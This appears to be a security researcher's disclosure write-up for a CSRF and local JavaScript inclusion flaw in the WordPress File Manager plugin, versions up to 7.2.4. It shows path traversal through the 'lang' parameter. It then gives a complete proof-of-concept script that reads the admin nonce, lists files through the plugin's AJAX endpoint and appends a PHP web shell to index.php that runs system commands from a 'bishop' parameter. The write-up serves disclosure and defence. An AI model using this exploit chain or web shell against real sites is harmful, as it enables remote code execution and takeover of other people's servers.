## Addendum

Wordfence wrote their own article for this CVE.

## Description 

The File Manager plugin for WordPress is vulnerable to Cross-Site Request Forgery in all versions up to, and including, 7.2.4. 
This is due to missing or incorrect nonce validation on the wp_file_manager page that includes files through the 'lang' parameter. 
This makes it possible for unauthenticated attackers to include local JavaScript files that can be leveraged to achieve RCE via a 
forged request granted they can trick a site administrator into performing an action such as clicking on a link. 
This issue was partially patched in version 7.2.4, and fully patched in 7.2.5.

### Discovery 

Initially carrying out checks for LFI noticed the Language select field would try to get a Javascript file depending on the language selected. A request was still made when the field was empty, and directory traversal was possible with "../". 

A ".js" is appended to the query, initially I tried splitting the URL with null bytes, converting the lang parameter to another query, adding # for a split on the fragment, while it may be possible; I moved on.

http://127.0.0.1:1337/wp-admin/admin.php?page=wp_file_manager&lang=bg#elf_l1_Lw

<Image src={Image1} alt="" />

After switching the language the application is trying to find:
```
http://127.0.0.1:1337/wp-content/plugins/wp-file-manager/lib/js/i18n/elfinder.bg.js?ver=7.2.2
```

Modifying the URL:
```
http://127.0.0.1:1337/wp-admin/admin.php?page=wp_file_manager&lang=../../../../../../#elf_l1_Lw
```
<Image src={Image2} alt="" />

After Inserting the "../" the resulting query looks like this.
```
http://127.0.0.1:1337/wp-content/plugins/.js/?ver=7.2.2
```
providing a sufficient amount will hit the base URL:
```
http://127.0.0.1:1337/wp-admin/admin.php?page=wp_file_manager&lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F#elf_l1_Lw
```
<Image src={Image3} alt="" />

This increases the attack vector as the attacker has more opportunities to upload a JavaScript file on the server. 

## Attack prerequisites 

Given the "lang" parameter is requesting a JavaScript file and we can have the freedom to control where the victim retrieves it from.
We need to create a malicious JavaScript file; fairly typical for CSRF vulnerabilities to exploit the privileges of the victim to promote an attackers account, 
this attack doesn't specifically require the attack to be authenticated; so long as they can get a JavaScript file on the host. 
The Proof of concept script allows Remote Code Execution by getting the Administrator to edit a WordPress PHP file, appending basic Web Shell capabilities. 

For this example Ill be placing the poc.js file, under the "/wp-content/uploads/" directory.

## Proof Of Concept

### poc.js

```javascript

    function genRid(){
        return reqId = (+ new Date()).toString(16) + Math.floor(1000 * Math.random()).toString(16);
    }

```

The WordPress Nonce is read from the document object available when the script is first called.

```javascript

    var nonceget = document.querySelector("#file_manager_free_shortcode_admin-jsextra").text;
    nonce = nonceget.slice(89,99);

```

The initial XMLHttpRequest utilizes the WordPress nonce and retrieves a list of files from WP
File Manager.

```javascript

    var req1 = new XMLHttpRequest();
    req1.open('GET', `http://127.0.0.1:1337/wp-admin/admin-ajax.php?action=mk_file_folder_manager&_wpnonce=${nonce}&networkhref=&cmd=open&target=l1_Lw&init=1&tree=1&_=1707815126701`, false);
    req1.withCredentials = true;
    req1.send();
    var obj = JSON.parse(req1.response);
```

If the resulting Object returns with files; index.php is located. 

```javascript
    
    if (obj['files']){
        obj['files'].forEach(element => { if (element['mime'] == "text/x-php" && element['name'] == "index.php") { editFile(element); } }); 
    } 
```

Finally the file is edited with a XMLHttpRequest inserting malicious PHP along with the exsisting file content in the base WordPress index.php file.

```javascript

    function editFile(element){
        
        var payload = "%3C%3Fphp%0Adefine(+'WP_USE_THEMES'%2C+true+)%3B%0Arequire+__DIR__+.+'%2Fwp-blogheader.php'%3B%0A%0Aif+(isset(%24_REQUEST%5B%22bishop%22%5D))%7B%0A%09echo+system(%24_REQUEST%5B%22bishop%22%5D)%3B%0A%7D%3B";
        var params = `action=mk_file_folder_manager&_wpnonce=${nonce}&networkhref=&cmd=put&target=${element["hash"]}&encoding=UTF-8&content=${payload}&reqid=${genRid()}`;
        var freq = new XMLHttpRequest();
        freq.open('POST', 'http://127.0.0.1:1337/wp-admin/admin-ajax.php', false);
        freq.withCredentials = true;
        freq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        freq.send(params);
        var freqResponse = freq.response;
    }

```

If successful the system commands can be executed via appending a bishop parameter to the
index page.
